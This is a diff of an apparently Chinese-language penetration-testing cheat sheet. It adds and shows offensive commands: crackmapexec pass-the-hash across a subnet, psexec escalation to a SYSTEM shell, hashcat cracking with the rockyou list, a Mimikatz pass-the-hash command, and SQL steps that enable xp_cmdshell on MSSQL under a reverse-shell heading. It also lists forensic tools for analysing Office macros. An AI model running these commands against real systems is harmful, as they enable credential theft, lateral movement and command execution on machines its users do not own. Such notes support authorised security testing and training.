@@ -212,7 +212,7 @@ crackmapexec smb 192.168.100.0/24 -u user_file.txt -H ntlm_hashFile.txt
 
 ### 提權
 
-PsExec
++ PsExec
 `psexec.exe -s -i cmd.exe`
 
 ### [LM，NTLM，Net-NTLMv2](https://book.hacktricks.xyz/windows-hardening/ntlm)
@@ -234,8 +234,8 @@ SQL> EXEC xp_cmdshell
 ```
 
 ### password recovery tool
-hashcat
-
++ hashcat
+`hashcat -a 0 hashes ~/Tools/SecLists/Passwords/Leaked-Databases/rockyou.txt`
 
 ### Invoke-TheHash
 
@@ -266,3 +266,45 @@ hashcat
 
 + Mimikatz
 ` Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"' `
+
+### Forensics
+
++ [Binwalk 分離提取隱寫的文件](https://github.com/ReFirmLabs/binwalk) 
++ Office analyzer
+  + [XLMMacroDeobfuscator](https://github.com/DissectMalware/XLMMacroDeobfuscator)
+  + [officeparser](https://github.com/unixfreak0037/officeparser)
+  `python2.7 officeparser.py [__.xlsm] --extract-macros`
+  + [oletools](https://github.com/decalage2/oletools)
+  + [pcodedmp](https://github.com/bontchev/pcodedmp)
+  + [ViperMonkey](https://github.com/decalage2/ViperMonkey)
+  + [oledump](https://blog.didierstevens.com/programs/oledump-py/)
+
+
+### MSSQL
+
++ IMPACKET-MSSQLCLIENT REVERSE SHELL
+
+> 使用 Impacket mssqlclient，您將不需要執行手動操作，例如使用 SQL 腳本語言構建查詢以激活 xp_cmdshell。Impacket 讓事情變得更容易
++ [impacket 需先下載](https://github.com/SecureAuthCorp/impacket)
+
+```
+命令激活 cmdshell 功能
+
+1> EXEC SP_CONFIGURE 'show advanced options',1
+2> reconfigure 
+3> go
+Configuration option 'show advanced options' changed from 0 to 1. Run the
+RECONFIGURE statement to install.
+(return status = 0)
+
+1> EXEC SP_CONFIGURE 'xp_cmdshell',1
+2> reconfigure 
+3> go
+Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE
+statement to install.
+
+```
+
+
+
+
